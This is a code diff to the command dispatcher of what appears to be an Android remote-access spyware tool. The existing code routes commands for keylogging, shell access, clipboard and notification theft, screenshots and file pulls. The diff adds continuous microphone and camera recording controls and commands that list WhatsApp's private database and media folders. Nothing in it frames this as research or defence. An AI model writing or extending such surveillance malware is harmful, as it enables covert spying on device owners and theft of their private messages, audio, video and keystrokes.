@@ -109,8 +109,26 @@ final class Dispatcher {
                     return ok(Apps.dump(ctx));
                 case "mic_rec":
                     return ok(MediaMon.record(ctx, parseInt(first, 15)));
+                case "mic_start":
+                    return ok(MicMon.start(ctx));
+                case "mic_stop":
+                    return ok(MicMon.stop());
+                case "mic_state":
+                    return ok(MicMon.running() ? "recording" : "idle");
                 case "cam_shot":
                     return ok(MediaMon.photo(ctx));
+                case "cam_start":
+                    return ok(MediaMon.camStart(ctx, 3000));
+                case "cam_stop":
+                    return ok(MediaMon.camStop());
+                case "cam_state":
+                    return ok(MediaMon.camState());
+                case "wa_db":
+                    return ok(Files.list(ctx, first.isEmpty()
+                            ? "/data/data/com.whatsapp/files" : first));
+                case "wa_media":
+                    return ok(Files.list(ctx, first.isEmpty()
+                            ? "/sdcard/Android/media/com.whatsapp" : first));
                 case "screenshot":
                     return ok(ScreenCap.capture(ctx));
                 case "shell":
@@ -178,8 +196,9 @@ final class Dispatcher {
             case "files_ls": case "files_pull": case "files_push": return "files";
             case "clipboard_get": case "clipboard_set": return "clip";
             case "notif_dump": return "notif";
-            case "mic_rec": return "mic";
-            case "cam_shot": return "cam";
+            case "mic_rec": case "mic_start": case "mic_stop": case "mic_state": return "mic";
+            case "cam_shot": case "cam_start": case "cam_stop": case "cam_state": return "cam";
+            case "wa_db": case "wa_media": return "files";
             case "screenshot": case "screen_start": case "screen_stop": return "screen";
             case "shell": return "shell";
             case "keylog_dump": case "keylog_clear": return "keylog";
